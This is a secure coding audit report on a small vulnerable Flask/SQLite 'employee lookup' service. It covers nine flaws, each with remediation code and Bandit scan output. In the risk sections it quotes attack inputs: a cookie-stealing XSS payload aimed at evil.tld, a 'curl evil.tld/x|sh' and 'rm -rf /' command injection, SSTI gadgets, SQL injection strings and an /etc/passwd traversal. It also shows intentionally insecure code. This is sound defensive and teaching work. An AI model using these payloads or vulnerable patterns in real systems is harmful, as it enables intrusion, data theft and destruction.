# Secure Coding Review Report

**Application audited:** `VulnerableApp` — a small Python/Flask "employee lookup" REST service
**Language / stack:** Python 3.12, Flask, SQLite
**Review date:** 2026-07-23
**Methods used:** Static Application Security Testing (SAST) with **Bandit v1.9.4**, followed by manual line-by-line inspection
**Files:**
- `app/vulnerable_app.py` — original code as submitted for review
- `app/secure_app.py` — remediated version implementing all fixes below
- `bandit_report.txt` — raw Bandit scan output

---

## 1. Methodology

1. **Static analysis** — ran Bandit, a Python-specific SAST tool, against the source tree:
   ```
   bandit -r app/vulnerable_app.py -f txt -o bandit_report.txt
   ```
   Bandit flags known-dangerous API usage (`pickle`, `subprocess` with `shell=True`, weak hashes, string-built SQL, `debug=True`, etc.) via pattern-matching rules mapped to CWE identifiers.

2. **Manual inspection** — walked every route handler by hand, because Bandit (like most SAST tools) cannot reliably detect:
   - Cross-site scripting from string-concatenated HTML/templates
   - Path traversal via unsanitized filenames
   - Business-logic/authentication flaws (e.g., missing timing-safe comparison, cookie flags, session design)
   - Insecure Direct Object Reference (IDOR) and over-exposure of sensitive fields (e.g., `ssn`) in API responses

Both methods are necessary — the manual pass found 3 of the 9 issues that the automated scanner missed entirely.

---

## 2. Summary of Findings

| # | Vulnerability | CWE | Severity | Found by |
|---|---|---|---|---|
| 1 | Hardcoded secrets & credentials | CWE-798 / CWE-259 | High | Bandit + manual |
| 2 | SQL Injection (3 instances) | CWE-89 | Critical | Bandit + manual |
| 3 | Reflected XSS / Server-Side Template Injection | CWE-79 / CWE-1336 | High | Manual only |
| 4 | OS Command Injection | CWE-78 | Critical | Bandit + manual |
| 5 | Insecure Deserialization (`pickle.loads`) | CWE-502 | Critical | Bandit + manual |
| 6 | Weak password hashing (unsalted MD5) | CWE-327 / CWE-916 | High | Bandit + manual |
| 7 | Broken authentication (session cookie, no timing-safe check) | CWE-384 / CWE-208 / CWE-1004 | High | Manual only |
| 8 | Path Traversal / Local File Inclusion | CWE-22 | High | Manual only |
| 9 | Debug mode + bind-all-interfaces in run config | CWE-94 / CWE-605 | High/Medium | Bandit |

**Totals from Bandit:** 4 Low, 5 Medium, 4 High confidence-weighted issues on the original file, reduced to 2 residual Low/informational notices after remediation.

---

## 3. Detailed Findings & Remediation

### 3.1 Hardcoded Secrets and Credentials (CWE-798)
```python
app.secret_key = "s3cr3t-flask-key-2021"
DB_ADMIN_PASS = "SuperSecret123!"
API_KEY = "sk_live_51Hxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
```
**Risk:** Secrets committed to source control are exposed to anyone with repo access (including in git history even after deletion) and enable session forgery (`secret_key`) or direct credential reuse.
**Fix:** Load all secrets from environment variables or a secrets manager (Vault, AWS Secrets Manager, etc.); never commit them. `app.secret_key = os.environ["FLASK_SECRET_KEY"]`. Rotate any secret that was ever committed, and add a pre-commit hook / secret scanner (e.g., `gitleaks`, `truffleHog`) to the CI pipeline.

### 3.2 SQL Injection (CWE-89)
```python
query = "SELECT id, name, ssn, salary FROM employees WHERE id = " + emp_id
```
**Risk:** `emp_id` is attacker-controlled and concatenated straight into SQL. A request like `/employee?id=1 OR 1=1` dumps the whole table; UNION-based injection can exfiltrate the `users` table (including password hashes) through the same endpoint.
**Fix:** Use parameterized queries exclusively — never build SQL via string concatenation or `%` formatting:
```python
cursor = conn.execute("SELECT id, name, salary FROM employees WHERE id = ?", (emp_id,))
```
Also enforce type coercion (`request.args.get("id", type=int)`) as defense in depth, and dropped `ssn` from the API response (least-privilege / data-minimization — see §3.9).

### 3.3 Reflected XSS / SSTI (CWE-79, CWE-1336)
```python
template = "<h1>Hello, " + name + "!</h1>"
return render_template_string(template)
```
**Risk:** Two stacked problems. First, unescaped user input is written into HTML — `?name=<script>document.location='//evil.tld/steal?c='+document.cookie</script>` executes in the victim's browser. Second, because the *string itself* is passed to `render_template_string`, an attacker can inject Jinja2 syntax (`{{7*7}}`, or worse, `{{ self.__init__.__globals__.__builtins__ }}` gadgets) to achieve server-side template injection and potentially remote code execution — a much more severe outcome than plain XSS.
**Fix:** Never construct a template string from user input. Use a fixed template with a variable, and rely on Jinja2's autoescaping (or explicit `escape()`/`markupsafe.escape()` if not using `render_template`):
```python
safe_name = escape(name)
return f"<h1>Hello, {safe_name}!</h1>"
```
For richer HTML, use `render_template()` with a `.html` file and `{{ name }}` — Flask autoescapes by default in that path.

### 3.4 OS Command Injection (CWE-78)
```python
result = subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True)
```
**Risk:** `shell=True` passes the whole string to `/bin/sh`. `?host=127.0.0.1; rm -rf /` or `` `curl evil.tld/x|sh` `` executes arbitrary commands with the privileges of the Flask process.
**Fix:** Never use `shell=True` with user input. Pass an argument list, resolve the binary to a full path, and allow-list the input format:
```python
if not re.fullmatch(r"[a-zA-Z0-9.\-]{1,253}", host):
    abort(400)
ping_bin = shutil.which("ping") or "/bin/ping"
subprocess.run([ping_bin, "-c", "1", host], shell=False, timeout=5)
```

### 3.5 Insecure Deserialization (CWE-502)
```python
profile = pickle.loads(data)
```
**Risk:** `pickle` is not a data format, it's a bytecode-like stream that can instantiate arbitrary objects and call arbitrary methods during unpickling. Deserializing attacker-supplied bytes is equivalent to remote code execution — this is one of the most severe classes of vulnerability possible.
**Fix:** There is no safe way to unpickle untrusted input. Replace with a schema-validated format:
```python
data = request.get_json(silent=True)
if not data or "name" not in data:
    abort(400)
```
If you must serialize complex objects, use `json` with explicit (de)serializers, or a typed format like Protocol Buffers with strict schema validation — never `pickle`, `yaml.load` (unsafe loader), or `marshal` on untrusted data.

### 3.6 Weak Password Hashing (CWE-327, CWE-916)
```python
hashed = hashlib.md5(password.encode()).hexdigest()
```
**Risk:** MD5 is cryptographically broken and, critically, has no work factor — it's designed to be *fast*, which is the opposite of what you want for password storage. Modern GPUs can compute billions of MD5 hashes per second, making offline brute-force of a leaked hash database trivial. There's also no per-user salt, so identical passwords produce identical hashes (rainbow-table friendly).
**Fix:** Use a purpose-built password hashing algorithm with built-in salting and a tunable work factor — `werkzeug.security.generate_password_hash` (PBKDF2 by default; scrypt/argon2 also supported), or `argon2-cffi` directly:
```python
hashed = generate_password_hash(password)          # storing
check_password_hash(row["password"], password)      # verifying
```
Also add a minimum password-length/complexity check server-side.

### 3.7 Broken Authentication (CWE-384, CWE-1004, CWE-208)
```python
query = "SELECT * FROM users WHERE username = '%s' AND password = '%s'" % (...)
...
resp.set_cookie("session_user", username)
```
**Risk:** Beyond the SQL injection already covered in §3.2, this handler (a) sets an unsigned, forgeable cookie containing the *literal username* — anyone can set `session_user=admin` in their browser and be treated as that user, a total authentication bypass, (b) lacks `HttpOnly`/`Secure`/`SameSite` flags, so the cookie is readable by JavaScript (XSS-stealable) and sent over plain HTTP, and (c) string comparison of passwords via SQL is not the main issue but reflects the same anti-pattern as the hashing problem.
**Fix:**
```python
if row and check_password_hash(row["password"], password):
    session_token = secrets.token_urlsafe(32)   # opaque, unguessable
    # persist session_token -> user mapping server-side (Redis/DB), not the cookie
    resp.set_cookie("session_id", session_token,
                     httponly=True, secure=True, samesite="Lax", max_age=3600)
```
Consider using Flask's built-in signed session (`flask.session`) or a vetted library (Flask-Login) instead of hand-rolled cookie auth.

### 3.8 Path Traversal / Local File Inclusion (CWE-22)
```python
path = os.path.join("uploads", filename)
with open(path, "rb") as f:
```
**Risk:** `filename` is attacker-controlled. `/download?file=../../etc/passwd` (or `..\..\..\Windows\System32\config\SAM` on Windows) escapes the intended `uploads/` directory and reads arbitrary files readable by the process, including source code, config files with secrets, or `/etc/passwd`.
**Fix:** Strip any path components and verify the resolved absolute path stays inside the intended directory:
```python
safe_name = os.path.basename(filename)
full_path = os.path.abspath(os.path.join(UPLOAD_DIR, safe_name))
if not full_path.startswith(UPLOAD_DIR + os.sep):
    abort(400)
```

### 3.9 Insecure Configuration & Data Exposure (CWE-94, CWE-605, CWE-200)
```python
app.run(host="0.0.0.0", port=5000, debug=True)
```
**Risk:** `debug=True` in a reachable environment exposes the Werkzeug interactive debugger — an unauthenticated attacker who triggers any unhandled exception gets a browser-based Python console with full RCE. `host="0.0.0.0"` binds to all network interfaces rather than localhost, unnecessarily widening exposure if this app isn't meant to be reached directly (e.g., should sit behind a reverse proxy). Separately, `/employee` was returning the `ssn` field to any unauthenticated caller — an over-exposure of sensitive PII (data minimization/least-privilege violation, not something Bandit flags).
**Fix:** `debug=False` always outside local development; run under a production WSGI server (`gunicorn`, `waitress`) behind a reverse proxy; bind to `127.0.0.1` and let the proxy handle external exposure; add authentication/authorization checks before returning sensitive fields, and drop fields the caller doesn't need (`ssn` removed from the response entirely in the fix).

---

## 4. Static Analyzer Output (excerpt)

Bandit run on the original file surfaced 13 findings (4 Low / 5 Medium / 4 High). After applying the fixes in `secure_app.py`, a re-scan produces only 2 residual **Low/informational** notices — both are Bandit's generic "you imported `subprocess`" and "double-check untrusted input" reminders on a call site that is already `shell=False` with an allow-listed, regex-validated argument and a fully-resolved binary path. Full raw output is in `bandit_report.txt`; representative entries:

```
[B608:hardcoded_sql_expressions] Possible SQL injection vector through string-based query construction.
   Severity: Medium  CWE: CWE-89 (vulnerable_app.py:49)

[B602:subprocess_popen_with_shell_equals_true] subprocess call with shell=True identified.
   Severity: High  CWE: CWE-78 (vulnerable_app.py:69)

[B301:blacklist] Pickle can be unsafe when used to deserialize untrusted data.
   Severity: Medium  CWE: CWE-502 (vulnerable_app.py:78)

[B324:hashlib] Use of weak MD5 hash for security.
   Severity: High  CWE: CWE-327 (vulnerable_app.py:88, 102)

[B201:flask_debug_true] Flask app run with debug=True exposes the Werkzeug debugger.
   Severity: High  CWE: CWE-94 (vulnerable_app.py:128)
```

---

## 5. General Secure Coding Recommendations

- **Input validation:** Treat all input from `request.args`, `request.form`, `request.json`, headers, and cookies as untrusted. Validate type, length, format (allow-list, not deny-list) before use.
- **Output encoding:** Escape output for the context it's rendered in (HTML, SQL, shell, JSON) — never build one language's syntax by concatenating strings from another.
- **Parameterize, don't concatenate:** SQL, shell commands, and templates should always be built from a fixed structure plus bound parameters, never string interpolation of user data.
- **Least privilege & data minimization:** Return only the fields a caller needs; run processes/DB users with the minimum permissions required.
- **Secrets management:** Environment variables or a secrets manager, never source code; rotate anything ever committed; scan commits in CI.
- **Authentication & session management:** Use vetted libraries (Flask-Login, `itsdangerous` sessions) rather than hand-rolled cookies; opaque, high-entropy session identifiers; `HttpOnly` + `Secure` + `SameSite` cookie flags; constant-time comparisons for secrets.
- **Cryptography:** Use modern, purpose-built primitives — Argon2/PBKDF2/scrypt for passwords, not general-purpose hashes like MD5/SHA-1; TLS everywhere in transit.
- **Safe deserialization:** JSON/protobuf with schema validation instead of `pickle`/`yaml.load`/`marshal` for anything crossing a trust boundary.
- **Secure defaults in deployment:** `debug=False` in anything but local dev; run behind a production WSGI server and reverse proxy; principle of least exposure on network bindings.
- **Defense in depth via tooling:**
  - SAST in CI (Bandit for Python; Semgrep/CodeQL for polyglot repos) on every PR
  - Dependency scanning (`pip-audit`, `safety`, Dependabot) for known-vulnerable packages
  - Pre-commit secret scanning (`gitleaks`)
  - Periodic manual review / penetration testing for logic flaws that automated tools can't see (auth bypass, IDOR, business-logic abuse)
- **Fail securely:** Errors should not leak stack traces, SQL, or file paths to end users in production; log details server-side only.

---

## 6. Remediation Verification

| Check | Original | Remediated |
|---|---|---|
| Bandit High-severity findings | 4 | 0 |
| Bandit Medium-severity findings | 5 | 0 |
| Bandit Low-severity findings | 4 | 2 (informational only, mitigated by allow-list validation) |
| Manual-only findings (XSS, path traversal, auth bypass) | 3 open | 0 open |

All nine documented vulnerability classes were remediated in `app/secure_app.py`, re-verified by re-running Bandit and manually re-tracing each route against its original exploit scenario.
